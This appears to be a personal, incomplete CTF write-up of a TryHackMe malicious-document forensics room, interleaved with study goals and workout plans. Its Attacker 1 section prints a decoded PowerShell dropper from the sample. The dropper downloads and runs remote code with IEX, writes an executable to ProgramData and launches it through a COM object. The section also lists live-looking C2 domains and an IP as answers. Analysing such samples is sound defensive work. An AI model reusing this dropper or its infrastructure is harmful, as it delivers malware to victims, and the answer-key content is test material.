# Squid-Game Help-Thorough

Name: Squid-Game
Date:  
Difficulty: Hard
Goals:  
- Novelty
- Sweet Points
- All the Malwares, but for the future
- YARA rules - useful
- If has docker use more docker
- Solution to just never email or open documents ever
- Automation if possible
- Finish: main, BR and unfinished supplementary  by end of Monday 
- Use more `assert` in my programming
- C Source code for Rust/Golang Malware
- Read Malware Analyst's Cookbook 
- Other Objectives
Learnt:
- https://github.com/PaperMtn
- Lena Rain is an awesome Composer - hackmud soundtrack hit very nicely at points
- oletoolage
- some vba
- Forensics and a reminder of why Columbo is the best
Beyond Root:
- FEATURE CREEP MALWARE AND DETECTION
- BiS Cyberchef
- Forensics QB methodology
- Finish https://tryhackme.com/r/room/sandboxevasion and https://tryhackme.com/r/room/deadend
- Guided Hacking relevant playlist
	- https://www.youtube.com/watch?v=zzpz3VYKzUw - YARA rules reminder
	- https://www.youtube.com/watch?v=wSkUbP9t4Dw - reversing a loader
	- https://www.youtube.com/watch?v=TgYb3hwOAV4 - Crypters how?
	- https://www.youtube.com/watch?v=cNP6QXXUxro Lockbit document
	- https://www.youtube.com/watch?v=o0fvdfEmQAk - Lockbit killchain
	- https://www.youtube.com/playlist?list=PLt9cUwGw6CYFrFbDkpdHi43ti5dmUfoOd - anti debuging techniques
	- finalise a list for ten single play games that I would like to hack to make the game *playable*, not cheatable - to pick from in the future if I need stuff to do and relax and to keep me relaxing while these weeks and months roll on by.
- Squeeze the 100ish pages from Art of Exploitation into using C related things I struggle to remember or use because of beginner based projects


- [[Squid-Game-Notes-Attacker]]
- [[Squid-Game-CMD-by-CMDs.md]]

Warning I am an idiot and this Helped-thorourgh is only a write because I will try to upgrade any Malware and detections and mitigations. I briefly skimmed to have an idea of the direction to complete this: [kumarishefu Medium Writeup](https://medium.com/@kumarishefu.4507/try-hack-me-write-up-squid-game-1102eb0b7230); this women is a amazing and anyone who has completed this without assistance is awesome. It is very sad that these great people will have to work in places where they just open all the bad pdfs and documents files. All got from it was that I need to use tools I have used in HTB Forensics challenge (`oletools`) and a healthy dosing of the great `cyberchef`. I have also not watch Squid Game so I ask Chatgpt to provide some information as if I was an alien, I will not use Chatgpt in completing this. Basically its Korean-Pre apocalyptic version of Roman Coliseum with instead of glory being the currency, Yen is the currency that the participants strive for, because their master have no creativity and have ruined themselves to hasten the end of Korean civilisation like all civilisations. Themes of death with change, guilt or mercilessness, survival and power and powerless. Remember it could always be worse than Squid Games, like the [Despair Squid](https://www.youtube.com/watch?v=ce-Uc3InSxk). Anyway this is a CTF I plan to tie as many relevant projects, unfinished CTFs and personal goals.

Firstly mute THM tab before you loose your mind!
![](savingyoursanity.png)

Also do you eyes a favour:
![](terminaleyes.png)

## My Scenario

Fixed this to reflect actually finding from QB methods

0. 50 Tyson Pushups because I want 300 a day by the end of next month so I look like [Witcher 2 Trailer levels of awesome](https://www.youtube.com/watch?v=tEA_wUk5pUs) , [L squat for 1 minute to trouble all the weebs with deductive reasoning](https://www.youtube.com/watch?v=CmVV4q_fSCk) and [1 minute plank to remind the furries that the trees have ears (Best have done is 4:22 minute plank](https://www.youtube.com/watch?v=Iw0jwrWqOKI))
1. 1 Hour per Attacker Document, record what I did in [[Squid-Game-Notes-Attacker]]
2. 50 Tyson Pushups because I want 300 a day by the end of next month so I look like [Witcher 2 Trailer levels of awesome](https://www.youtube.com/watch?v=tEA_wUk5pUs) , [L squat for 1 minute to trouble all the weebs with deductive reasoning](https://www.youtube.com/watch?v=CmVV4q_fSCk) and [1 minute plank to remind the furries that the trees have ears (Best have done is 4:22 minute plank](https://www.youtube.com/watch?v=Iw0jwrWqOKI))
3. 30 minutes following multiple Writeups -> Collect Forensics and Malware Dev Problem solving Patterns
4. 30 minutes ideas, rest, code scaffolding and copying (no Chatgpt); MUST have detection for each - so this should be a very fast and loose - focus on stupid questions not answers; minutes QB Method, Archive additions
5. Repeat if there is time - replace Room for Attacker-X or code X and hopeful [Ionian nerve grip my problems](https://www.youtube.com/watch?v=xOFrFt5gKFw) and [For the emperor!](https://www.youtube.com/watch?v=7IMuLiNWyHg)

2 hours

5 Days of Squid-Gaming
5 Days of tangent unfinished rooms that are CTFs 

Progress only the necessary, non-linear THM  
https://tryhackme.com/r/room/squidgameroom
https://tryhackme.com/r/room/maldoc
https://tryhackme.com/r/room/advancedstaticanalysis
https://tryhackme.com/r/room/androidmalwareanalysis
https://tryhackme.com/r/room/androidhacking101

For my Starting point see [[Squid-Game-Meta-Notes]] 

## Scenario

Accept the invitation? (Yes/No)
```
Yes
```

Tools on the box of note:
- `trid`
- `vmonkey`
- oletools each can be run like:
	- `oleid`
	- `olebrowse`   
	- `oledir` 
	- `oledump.py`
	- `olefile`     
	- `olemap`
	- `olemeta`     
	- `oleobj`
	- `oletimes`
	- `olevba`

## Attacker 1

[Medium @kumarishefu.4507 Attacker 1](https://medium.com/@kumarishefu.4507/try-hack-me-write-up-squid-game-attacker1-9b4509882524); I got questions 6 - 9; checked [papermtn's blog](https://papermtn.co.uk/tryhackme-squid-game-attacker-1/), but it does not use different tools

What is the malicious C2 domain you found in the maldoc where an executable download was attempted?; Answer:
```
fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas
```
QB-Forensics-Notes:
```
```
What executable file is the maldoc trying to drop?; Answer:
```
QdZGP.exe
```
QB-Forensics-Notes:
```
```
In what folder is it dropping the malicious executable? (hint: %Folder%); Answer:
```
%ProgramData%
```
QB-Forensics-Notes:
```
Knowing Windows Knowing your favourite folders! AHAAAA  
USED THE POWER OF MY BRAIN!
```
Provide the name of the COM object the maldoc is trying to access.; Answer:
```bash
# dork com object -thm C08AFD90-F2A1-11D1-8455-00A0C91F3880
ShellBrowserWindow
```
QB-Forensics-Notes:
```
```
Include the malicious IP and the php extension found in the maldoc. (Format: IP/name.php); Answer:
```
176.32.35.16/704e.php
```
QB-Forensics-Notes:
```
```
Find the phone number in the maldoc. (Answer format: xxx-xxx-xxxx); Answer:
```bash
olemeta attacker1.doc
# 213-446-1757
```
QB-Forensics-Notes:
```
Metadata 
```
Doing some static analysis, provide the type of maldoc this is under the keyword “AutoOpen”.; Answer:
```bash
olevba
# AutoExec
```
QB-Forensics-Notes:
```
```
Provide the subject for this maldoc. (make sure to remove the extra whitespace); Answer:
```bash
olemeta attacker1.doc
# 213-446-1757
# West Virginia  Samanta
```
Provide the time when this document was last saved. (Format: YEAR-MONTH-DAY XX:XX:XX); Answer:
```bash
oletimes
# 2019-02-07 23:45:30
```
QB-Forensics-Notes:
```
Timestamp modification affect Forensic time lining
```
Provide the stream number that contains a macro.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the name of the stream that contains a macro.; Answer:
```
```
QB-Forensics-Notes:
```
```

Important Takeways
```bash
# Noting went well I found and noted Replace() function that helps in decoding the powershell script

# Best practice seems to be go string by string till you hit a good line
oledump.py -s $int $maldoc
oledump.py -s $specialLineNum -S $maldoc
```

![](followingonday1.png)

Nice bit of bad php that contains answers 1-5
```php
$instance = [System.Activator]::CreateInstance("System.Net.WebClient");
$method = [System.Net.WebClient].GetMethods();
foreach($m in $method){

  if($m.Name -eq "DownloadString"){
    try{
     $uri = New-Object System.Uri("http://176.32.35.16/704e.php")
     IEX($m.Invoke($instance, ($uri)));
    }catch{}

  }

  if($m.Name -eq "DownloadData"){
     try{
     $uri = New-Object System.Uri("http://fpetraardella.band/xap_102b-AZ1/704e.php?l=litten4.gas")
     $response = $m.Invoke($instance, ($uri));

     $path = [System.Environment]::GetFolderPath("CommonApplicationData") + "\\QdZGP.exe";
     [System.IO.File]::WriteAllBytes($path, $response);

     $clsid = New-Object Guid 'C08AFD90-F2A1-11D1-8455-00A0C91F3880'
     $type = [Type]::GetTypeFromCLSID($clsid)
     $object = [Activator]::CreateInstance($type)
     $object.Document.Application.ShellExecute($path,$nul, $nul, $nul,0)

     }catch{}
     
  }
}

Exit;
```


GB-X Notes
```
Columbo deals in components and I just looked at the VBA like the attacker would have wanted and fell down a particial rabbithole of fear!

Solution:
- Have a fast eye for what you want to look for first
- Input: toLookFor -> FastEyes(X amount of time) -> Output
```
## Attacker 2 

Provide the streams (numbers) that contain macros.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the size (bytes) of the compiled code for the second stream that contains a macro.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the largest number of bytes found while analyzing the streams.; Answer:
```
```
QB-Forensics-Notes:
```
```
Find the command located in the ‘fun’ field ( make sure to reverse the string).; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the first domain found in the maldoc.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the second domain found in the maldoc.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the name of the first malicious DLL it retrieves from the C2 server.; Answer:
```
```
QB-Forensics-Notes:
```
```
How many DLLs does the maldoc retrieve from the domains?; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the path of where the malicious DLLs are getting dropped onto?; Answer:
```
```
QB-Forensics-Notes:
```
```
What program is it using to run DLLs?; Answer:
```
```
QB-Forensics-Notes:
```
```
How many seconds does the function in the maldoc sleep for to fully execute the malicious DLLs?; Answer:
```
```
QB-Forensics-Notes:
```
```
Under what stream did the main malicious script use to retrieve DLLs from the C2 domains? (Provide the name of the stream).; Answer:
```
```
QB-Forensics-Notes:
```
```
## Attacker 3 

Provide the executable name being downloaded.; Answer:
```
```
QB-Forensics-Notes:
```
```
What program is used to run the executable?; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the malicious URI included in the maldoc that was used to download the binary (without http/https).; Answer:
```
```
QB-Forensics-Notes:
```
```
What folder does the binary gets dropped in?; Answer:
```
```
Which stream executes the binary that was downloaded?; Answer:
```
```
QB-Forensics-Notes:
```
```
## Attacker 4

Provide the first decoded string found in this maldoc.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the name of the binary being dropped.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the folder where the binary is being dropped to.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the name of the second binary.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the full URI from which the second binary was downloaded (exclude http/https).; Answer:
```
```
QB-Forensics-Notes:
```
```
## Attacker 5

What is the caption you found in the maldoc?; Answer:
```
```
QB-Forensics-Notes:
```
```
What is the XOR decimal value found in the decoded-base64 script?; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the C2 IP address of the Cobalt Strike server. ; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the full user-agent found.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the path value for the Cobalt Strike shellcode.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the port number of the Cobalt Strike C2 Server.; Answer:
```
```
QB-Forensics-Notes:
```
```
Provide the first two APIs found.; Answer:
```
```
QB-Forensics-Notes:
```
```

## Post-Completion-Reflection  

## Beyond Root


#### Single player Game to Hack / Mod


- Graveyard Keeper
	- Speed increase
	- Energy reduced usage
	- Bigger inventory 
	- Infinite Storage
	- Animation speed
- Baldurs Gate 3 - not that it is bad, I want to see that game live on for the next 10-15 years it is that good
- Grey Hack - Because why not try one multiplayer game
	- Exfil scripts 